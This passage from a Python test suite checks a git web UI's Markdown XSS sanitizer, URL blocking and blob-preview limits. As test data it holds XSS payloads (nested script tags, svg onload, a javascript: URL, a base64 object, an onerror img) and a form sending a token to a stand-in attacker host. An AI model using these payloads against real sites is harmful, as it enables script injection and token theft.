    # Feature F34: Track 1 — Markdown XSS Sanitization & Large Blob Preview — Boundary & Corner Cases (5 Tests)
    # =========================================================================
    def test_t2_f34_01_reject_nested_malformed_script_tags_style_injection_and_foreign_object_vectors(self) -> None:
        _, _, _, _, web = self.make_web_ui_rig()
        vectors = (
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            '<math><mtext><option><FAKEFAKE><svg onload=alert(1)>',
            '<style>body { background: url("javascript:alert(1)") }</style>',
            '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
            '<form action="https://evil.example/steal"><input name="tok"></form>',
        )
        for vec in vectors:
            out = web.render_safe_markdown(vec).lower()
            for forbidden in ("<script", "<svg", "<style", "<object", "<form", "<input", "onload="):
                self.assertNotIn(forbidden, out)

    def test_t2_f34_02_reject_external_image_urls_and_protocol_relative_or_backslash_urls_under_strict_csp(self) -> None:
        _, _, _, _, web = self.make_web_ui_rig()
        md = (
            "![ext](https://tracker.evil.example/pixel.png) "
            "![proto](//evil.example/p.png) "
            "![bs](\\\\evil.example\\p.png) "
            "![local](/static/logo.png)"
        )
        out = web.render_safe_markdown(md)
        self.assertNotIn("https://tracker.evil.example/pixel.png", out)
        self.assertEqual(out.count('data-sanitized-url="blocked"'), 3)
        self.assertIn('src="/static/logo.png"', out)

    def test_t2_f34_03_reject_out_of_range_max_bytes_and_max_lines_on_blob_preview(self) -> None:
        git_fx, _, _, _, web = self.make_web_ui_rig()
        for bad_bytes in (0, 255, 262_145, -1):
            self.assertEqual(web.build_blob_preview(git_fx.blobs["readme"], max_bytes=bad_bytes)[0], 400)
        for bad_lines in (0, 2001, -5):
            self.assertEqual(web.build_blob_preview(git_fx.blobs["readme"], max_lines=bad_lines)[0], 400)

    def test_t2_f34_04_interior_invalid_utf8_byte_sequence_is_classified_as_binary_hex_preview(self) -> None:
        git_fx, _, _, _, web = self.make_web_ui_rig()
        # Invalid UTF-8 byte 0xff in the middle of ASCII text (not at the truncation boundary)
        bad_utf8 = b"valid header\n\xff\xfeinvalid interior\n" + (b"padding\n" * 20)
        proc = subprocess.run(
            ["git", f"--git-dir={git_fx.bare_dir}", "hash-object", "-w", "--stdin"],
            input=bad_utf8,
            stdout=subprocess.PIPE,
            env=GIT_ENV,
            check=True,
        )
        oid = proc.stdout.decode("ascii").strip()
        st, prev = web.build_blob_preview(oid, max_bytes=1024)
        self.assertEqual(st, 200)
        self.assertTrue(prev["is_binary"])
        self.assertIn("ff fe", prev["hex_preview"])

    def test_t2_f34_05_xss_payload_inside_git_commit_message_or_source_blob_is_escaped_in_web_views(self) -> None:
        git_fx, _, _, _, web = self.make_web_ui_rig()
        xss_blob = b'<script>window.pwned = true;</script>\n'
        t_xss = git_fx.write_tree({"xss.html": ("100644", xss_blob)})
        c_xss = git_fx.commit_tree(t_xss, [git_fx.commits["c2"]], 'Fix <img src=x onerror=alert(1)> bug')
        st_c, html_c, _, _ = web.get_commit_detail_view(ALICE, DEFAULT_REPO_ID, c_xss)
        self.assertEqual(st_c, 200)
        self.assertNotIn("<script>window.pwned", html_c)
        self.assertNotIn("<img src=x onerror=alert(1)>", html_c)
        self.assertIn("&lt;script&gt;", html_c)

